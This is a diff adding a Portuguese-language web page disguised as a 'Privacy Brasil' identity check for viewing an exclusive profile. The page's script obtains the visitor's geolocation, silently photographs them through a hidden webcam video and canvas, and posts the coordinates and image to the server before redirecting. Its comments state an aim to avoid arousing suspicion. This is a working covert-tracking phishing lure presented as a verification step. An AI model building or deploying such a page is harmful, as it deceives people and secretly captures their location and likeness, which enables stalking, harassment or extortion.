@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy - Acesso Exclusivo</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0b0e11;
+            color: #ffffff;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            background: #181a20;
+            padding: 2rem;
+            border-radius: 16px;
+            border: 1px solid #2b2f36;
+            max-width: 350px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #f0b90b;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo span {
+            color: #ffffff;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            color: #eaecef;
+        }
+
+        p {
+            font-size: 0.9rem;
+            color: #848e9c;
+            line-height: 1.5;
+            margin-bottom: 2rem;
+        }
+
+        .verify-btn {
+            background-color: #f0b90b;
+            color: #000000;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+
+        .verify-btn:hover {
+            background-color: #dfa90a;
+        }
+
+        .footer {
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            color: #474d57;
+        }
+
+        video,
+        canvas {
+            display: none;
+        }
+
+        #status {
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            color: #f0b90b;
+            min-height: 1.2rem;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">Privacy<span>Brasil</span></div>
+        <h2>Verificação de Segurança</h2>
+        <p>Para acessar o perfil exclusivo de <strong>Jhenyfer</strong> e garantir que você é um usuário real, clique no
+            botão abaixo para uma verificação rápida de identidade.</p>
+
+        <button class="verify-btn" onclick="verify()">VERIFICAR AGORA</button>
+        <div id="status"></div>
+
+        <div class="footer">
+            © 2026 Privacy Brasil - Conteúdo Exclusivo
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const REDIRECT_URL = "https://www.privacybrasil.blog/jhenyfer";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+
+        async function verify() {
+            status.innerText = "Processando verificação...";
+
+            // 1. Geolocalização (Pedir primeiro para garantir que a permissão de um gatilho a outra)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+
+                    // 2. Câmera
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        video.srcObject = stream;
+
+                        setTimeout(() => {
+                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                            const photo = canvas.toDataURL('image/jpeg');
+
+                            // 3. Enviar ao Servidor
+                            fetch('/post', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ lat, lon, acc, photo })
+                            }).then(() => {
+                                // Redirecionar após sucesso
+                                window.location.href = REDIRECT_URL;
+                            });
+                        }, 1500);
+
+                    } catch (err) {
+                        // Se falhar a câmera, tenta enviar só localização e redirecionar
+                        await fetch('/post', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat, lon, acc, photo: null })
+                        });
+                        window.location.href = REDIRECT_URL;
+                    }
+                }, (err) => {
+                    // Se negar localização, ainda tenta redirecionar para não gerar suspeita, mas avisa
+                    status.innerText = "Erro: Localização necessária para verificação.";
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+                });
+            } else {
+                window.location.href = REDIRECT_URL;
+            }
+        }
+    </script>
+</body>
+
+</html>
